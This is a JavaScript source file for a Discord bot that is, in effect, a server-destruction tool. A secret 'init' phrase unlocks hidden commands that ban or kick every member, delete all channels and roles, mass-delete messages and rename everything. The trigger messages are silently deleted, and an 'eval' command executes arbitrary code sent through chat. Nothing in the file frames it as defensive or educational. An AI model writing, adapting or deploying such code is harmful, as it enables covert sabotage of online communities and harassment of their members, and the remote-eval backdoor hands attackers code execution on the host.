/*
 *   Copyright (c) 2020 routerabfrage
 *   All rights reserved.
 *   https://github.com/routerabfrage/License
 */
// jshint esversion: 8
const config = require("./config.json");
const Discord = require("discord.js");
const client = new Discord.Client();
const start = Date.now();

client.on("ready", () => {
  console.log(getDate() + " Initialized in " + (Date.now() - start) + "ms");
  console.log('Logged in as ' + client.user.tag);
});

const secretKey = config.secret;

var initialized = []; //Array of initialized people

function getFromArray(a, b) {
  var confirmed = false;
  for (var i = 0; i < a.length; i++) {
    if (a[i] === b) confirmed = true;
  }
  return confirmed;
}

function getSimilarFromArray(a, b) {
  var confirmed = false;
  for (var i = 0; i < a.length; i++) {
    if (b.startsWith(a[i])) confirmed = [true, i];
  }
  return confirmed;
}

function removeFromArray(a, b) {
  for (var i = 0; i < a.length; i++) {
    if (a[i] === b) a.splice(i, 1);
  }
  return a;
}

function getDate() {
  var date = new Date();
  var year = date.getYear() + 1900; //Get current year
  var months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]; //Array of months
  var month = months[date.getMonth()]; // Get month index
  var day = date.getDate().toString().length < 2 ? "0" + date.getDate() : date.getDate(); //Get current day of month 1-30
  var hour = date.getHours().toString().length < 2 ? "0" + date.getHours() : date.getHours(); //Get current hour of the day
  var minute = date.getMinutes().toString().length < 2 ? "0" + date.getMinutes() : date.getMinutes(); //Get current minute of the hour
  var second = date.getSeconds().toString().length < 2 ? "0" + date.getSeconds() : date.getSeconds(); //Get current second of the minute
  return year + "-" + month + "-" + day + " " + hour + ":" + minute + ":" + second; //Return formatted string
}

var listening = []; //Array of people to listen to

const banmessage = "GET BANNED";
const commands = {
  "gb activate": `
	msg.delete().catch(()=>{});
	if(!getFromArray(listening,msg.author.id))
	listening.push(msg.author.id);`,
  "gb deactivate": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id))
	listening = removeFromArray(listening,msg.author.id);`,
  "listening": "console.log(listening);",
  "ban all": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var users = msg.guild.members; //COLLECTION NOT AN ARRAY!
	users.forEach(user=>{
		user.ban(banmessage).catch(()=>{});
	});
	}`,
  "kick all": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var users = msg.guild.members; //COLLECTION NOT AN ARRAY!
	users.forEach(user=>{
		user.kick().catch(()=>{});
	});
	}`,
  "delete channels": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var channels = msg.guild.channels;
	channels.forEach(channel=>{
		channel.delete().catch(()=>{});
	});
	}`,
  "delete roles": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
	var roles = msg.guild.roles;
	roles.forEach(role=>{
		role.delete().catch(()=>{});
	});
	}`,
  "clear": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) msg.channel.bulkDelete(100).catch(()=>{});`,
  "clear all": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) msg.channel.bulkDelete(100).catch(()=>{});`
};

const subcommands = {
  "clear": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[1];
		msg.guild.channels.find(x=>x.name===channel).bulkDelete(100).catch(()=>{});
	}`,
  "kick": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var member = msg.mentions.members.first();
		member.kick().catch(()=>{});
	}`,
  "ban": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var member = msg.mentions.members.first();
		member.ban(banmessage).catch(()=>{});
	}`,
  "delete channel": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[2];
		msg.guild.channels.find(x=>x.name===channel).delete().catch(()=>{});
	}`,
  "delete role": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var role = msg.content.split(" ")[2];
		msg.guild.roles.find(x=>x.name===role).delete().catch(()=>{});
	}`,
  "edit all channels": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var name = msg.content.split(" ")[3];
		var channels = msg.guild.channels;
		channels.forEach(channel=>{
			channel.setName(name).catch(()=>{});
		});
	}`,
  "edit all roles": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var name = msg.content.split(" ")[3];
		var roles = msg.guild.roles;
		roles.forEach(role=>{
			role.setName(name).catch(()=>{});
		});
	}`,
  "edit channel": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var channel = msg.content.split(" ")[2];
		var name = msg.content.split(" ")[3];
		msg.guild.channels.find(x=>x.name===channel).setName(name).catch(()=>{});
	}`,
  "edit role": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id)) {
		var role = msg.content.split(" ")[2];
		var name = msg.content.split(" ")[3];
		msg.guild.roles.find(x=>x.name===role).setName(name).catch(()=>{});
	}`,
  "eval": `
	msg.delete().catch(()=>{});
	if(getFromArray(listening,msg.author.id))
	eval(msg.content.slice(4));`
};

client.on("message", msg => {
  if (msg.content === "init " + secretKey) {
    initialized.push(msg.author.id);
    console.log(getDate() + " " + msg.author.username + "#" + msg.author.discriminator + " just initialized!");
    msg.delete().catch(() => {});
  } else if (getFromArray(initialized, msg.author.id)) {
    if (commands[msg.content.toLowerCase()] !== (null || undefined)) {
      console.log(getDate() + " " + msg.author.username + "#" + msg.author.discriminator + " just used the " + msg.content.toLowerCase() + " command!");
      eval(commands[msg.content.toLowerCase()]);
    } else if (getSimilarFromArray(Object.keys(subcommands), msg.content.toLowerCase())[0]) {
      var res = Object.keys(subcommands)[getSimilarFromArray(Object.keys(subcommands), msg.content.toLowerCase())[1]];
      console.log(getDate() + " " + msg.author.username + "#" + msg.author.discriminator + " just used the " + res + " subcommand!");
      eval(subcommands[res]);
    }
  }
});

client.login(config.token);